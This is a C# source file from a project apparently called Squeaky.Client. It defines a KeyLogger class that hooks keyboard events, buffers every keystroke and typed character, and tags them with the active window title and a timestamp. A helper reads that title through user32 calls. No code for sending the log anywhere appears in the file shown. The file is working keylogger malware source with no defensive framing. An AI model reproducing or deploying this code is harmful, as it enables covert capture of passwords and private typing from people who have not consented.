using Gma.System.MouseKeyHook;
using System.Windows.Forms;
using System.Collections.Generic;
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Globalization;

namespace Squeaky.Client.Utilities
{
    class KeyLogger
    {
        private static StringBuilder LogBuffer = new StringBuilder();
        private static string LastWindowTitle = "";

        public static List<Keys> PressedKeys;
        public static List<Char> PressedChars;

        private static void OnKeyDown(object sender, KeyEventArgs e)
        {
            var activeWindowTitle = KeyLoggerHelper.GetForegroundWindowTitle();
            if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != LastWindowTitle)
            {
                LastWindowTitle = activeWindowTitle;
                LogBuffer.Append($"\n[{activeWindowTitle}] [{DateTime.Now.ToString("HH:mm:ss")}]\n");
            }

            if (!KeyLoggerHelper.IsExcludedKey(e.KeyCode) && !PressedKeys.Contains(e.KeyCode))
            {
                PressedKeys.Add(e.KeyCode);
                LogBuffer.Append($"[{e.KeyCode.ToString()}]");
            }
        }

        private static void OnKeyUp(object sender, KeyEventArgs e)
        {
            PressedChars.Remove((char)e.KeyCode);
            PressedKeys.Remove(e.KeyCode);
        }

        private static void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            if (!PressedChars.Contains(e.KeyChar))
            {
                PressedChars.Add(e.KeyChar);
                LogBuffer.Append(e.KeyChar);
            }
        }
    }

    class KeyLoggerHelper
    {
        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        internal static extern IntPtr GetForegroundWindow();

        public static string GetForegroundWindowTitle()
        {
            StringBuilder sbTitle = new StringBuilder(1024);

            KeyLoggerHelper.GetWindowText(KeyLoggerHelper.GetForegroundWindow(), sbTitle, sbTitle.Capacity);

            return sbTitle.ToString();
        }

        public static bool IsExcludedKey(Keys k)
        {
            return (k >= Keys.A && k <= Keys.Z
                    || k >= Keys.NumPad0 && k <= Keys.Divide
                    || k >= Keys.D0 && k <= Keys.D9
                    || k >= Keys.Oem1 && k <= Keys.OemClear
                    || k >= Keys.LShiftKey && k <= Keys.RShiftKey
                    || k == Keys.CapsLock
                    || k == Keys.Space);
        }

        public static bool IsModifierKey(Keys key)
        {
            return (key == Keys.LControlKey
                    || key == Keys.RControlKey
                    || key == Keys.LMenu
                    || key == Keys.RMenu
                    || key == Keys.LWin
                    || key == Keys.RWin
                    || key == Keys.Control
                    || key == Keys.Alt);
        }
    }
}
